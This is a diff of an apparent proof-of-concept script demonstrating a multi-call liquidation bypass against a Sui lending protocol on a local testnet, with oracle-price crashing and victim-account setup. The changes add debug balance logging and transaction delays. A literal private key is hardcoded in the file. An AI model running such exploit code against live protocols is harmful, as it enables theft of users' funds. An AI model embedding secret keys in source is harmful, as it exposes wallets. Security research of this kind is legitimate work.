@@ -28,8 +28,7 @@ const SUI_TYPE = "0x2::sui::SUI";
 const USDC_TREASURY = "0x4e1a61e4f32731de824371748eaf58887a147eaded9845692ae3916c6a6b0aee";
 const ETH_TREASURY = "0x1702fa3e0c15291ef0667bffad8ff36c9424686d1a3e6edc976076ff8e3c0681";
 
-// PRIVATE KEY DOMPET 0xed76 (HARDCODED)
-const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
+const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa"; // Dompet 0xed76
 const privateKeyBytes = decodeSuiPrivateKey(funderPrivateKeyStr).secretKey;
 const funderKeypair = Ed25519Keypair.fromSecretKey(privateKeyBytes);
 const funderAddress = funderKeypair.getPublicKey().toSuiAddress();
@@ -40,17 +39,26 @@ console.log(`[INIT] Funder Address: ${funderAddress}`);
 
 async function executeTx(tx, keypair) {
     tx.setSender(keypair.getPublicKey().toSuiAddress());
-    return client.signAndExecuteTransaction({
+    const result = await client.signAndExecuteTransaction({
         signer: keypair,
         transaction: tx,
         options: { showEffects: true, showObjectChanges: true }
     });
+    await new Promise(r => setTimeout(r, 1000)); // Jeda 1 detik agar local node tidak choke
+    return result;
 }
 
 async function getCoinObjectId(owner, coinType) {
     const coins = await client.getCoins({ owner, coinType });
     if (coins.data.length === 0) throw new Error(`No ${coinType} found for ${owner}`);
     return coins.data[0].coinObjectId;
+}
+
+async function printBalances(address) {
+    const suiBalance = await client.getBalance({ owner: address, coinType: SUI_TYPE });
+    const usdcBalance = await client.getBalance({ owner: address, coinType: USDC_TYPE });
+    const ethBalance = await client.getBalance({ owner: address, coinType: ETH_TYPE });
+    console.log(`[DEBUG] Balances for ${address.slice(0, 8)}...: SUI=${Number(suiBalance.totalBalance)/1e9} | USDC=${Number(usdcBalance.totalBalance)/1e9} | ETH=${Number(ethBalance.totalBalance)/1e9}`);
 }
 
 async function readObligationState(obligationId) {
@@ -75,7 +83,7 @@ async function setupVictim(victimKeypair, label) {
     const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
     console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);
 
-    // 1. Fund victim dengan 1,000 SUI (Agar muat di 1 koin gas)
+    // 1. Fund victim dengan 1,000 SUI
     const fundTx = new Transaction();
     const [suiCoin] = fundTx.splitCoins(fundTx.gas, [fundTx.pure.u64(1_000_000_000_000n + 10_000_000_000n)]);
     fundTx.transferObjects([suiCoin], fundTx.pure.address(victimAddr));
@@ -256,6 +264,9 @@ async function main() {
     console.log("║  PoC: Multi-Call Liquidation Bypass (Local Testnet)       ║");
     console.log("╚═══════════════════════════════════════════════════════════╝");
     
+    console.log("\n[DEBUG] Checking Funder Balances...");
+    await printBalances(funderAddress);
+
     const victimA = Ed25519Keypair.generate();
     const victimB = Ed25519Keypair.generate();
 
@@ -264,6 +275,9 @@ async function main() {
     
     await crashOraclePrice();
     
+    console.log("\n[DEBUG] Checking Funder Balances before Exploits...");
+    await printBalances(funderAddress);
+
     const beforeResult = await beforeExploit_singleCall(vA.obligationId);
     const afterResult = await afterExploit_multiCall(vB.obligationId);
     
